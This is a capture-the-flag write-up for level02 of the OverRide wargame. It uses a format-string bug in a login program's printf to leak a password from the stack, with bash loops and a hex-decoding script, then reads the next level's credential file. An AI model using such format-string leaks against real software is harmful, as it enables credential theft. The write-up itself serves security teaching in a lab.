# level02

In this level, we have a program that takes two inputs:

```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: lol
--[ Password: lol
*****************************************
lol does not have access!
```

As usual, let's start by decompiling the [source code](./source.c) with *Cutter*.
The `fgets` calls are safe, and the buffers are large enough to hold the input values.
This means there's no buffer overflow — so we’ll have to try a different approach.
We can see that the flag is being read and stored into a buffer:

```c
FILE* file = fopen("/home/users/level03/.pass", "r");
size = fread(file_content, 1, 0x29, file);
```

On line 60, there's an unsafe `printf` call using the `username` buffer.
This give us an opportunity to perform a **format string attack**.
Let’s try reading the stack to locate the flag:

```bash
for ((i = 1; i < 42; i++)); do echo -e "$i - %$i\$p\nAAAA" | ./level02 | grep "does"; done
```

Sample output:

```bash
1 - 0x7fffffffe4f0 does not have access!
2 - (nil) does not have access!
3 - 0x41 does not have access!
4 - 0x2a2a2a2a2a2a2a2a does not have access!
5 - 0x2a2a2a2a2a2a2a2a does not have access!
6 - 0x7fffffffe6e8 does not have access!
7 - 0x1f7ff9a08 does not have access!
8 - 0x41414141 does not have access!
...
22 - 0x756e505234376848 does not have access!
23 - 0x45414a3561733951 does not have access!
24 - 0x377a7143574e6758 does not have access!
25 - 0x354a35686e475873 does not have access!
26 - 0x48336750664b394d does not have access!
...
```

From offsets 22 to 26, we can see some unusual values — these are likely parts of the flag.
To extract and decode them, we need to:

- Extract the values.
- Remove the 0x prefix.
- Convert them from hexadecimal to ASCII.
- Reverse the bytes (due to little-endian encoding).

Let’s put this all together in a simple script:

```bash
for ((i = 22; i < 27; i++)); do
    echo -e "%$i\$p\nAAAA" | \
    ./level02 | \
    grep "does" | \
    awk '{printf("%s", substr($1, 3))}' | \
    xargs -I{} python -c 'import sys; sys.stdout.write("{}".decode("hex")[::-1]); sys.stdout.flush()';
done; echo
<flag>
```

Now let's try using this flag as the password:

```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: lol
--[ Password: <flag>
*****************************************
Greetings, lol!
$ cat /home/users/level03/.pass
<flag>
```
